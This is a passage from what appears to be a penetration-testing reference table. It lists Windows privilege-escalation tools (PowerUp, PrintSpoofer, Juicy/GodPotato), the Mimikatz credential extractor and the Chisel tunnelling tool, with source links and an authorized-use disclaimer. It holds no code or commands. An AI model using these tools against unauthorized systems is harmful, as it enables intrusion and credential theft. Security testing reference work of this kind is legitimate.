| PowerUp | Windows | PowerShell privesc checks | github.com/PowerShellMafia/PowerSploit |
| PrintSpoofer | Windows | SeImpersonate exploit | github.com/itm4n/PrintSpoofer |
| JuicyPotato | Windows | SeImpersonate (old Windows) | github.com/ohpe/juicy-potato |
| GodPotato | Windows | SeImpersonate (universal) | github.com/BeichenDream/GodPotato |
| Mimikatz | Windows | Credential extraction | github.com/gentilkiwi/mimikatz |
| Chisel | Both | Tunnel/port forwarding | github.com/jpillora/chisel |

---

> **Disclaimer:** This skill module is for authorized security testing and educational purposes only. Always obtain proper authorization before testing.
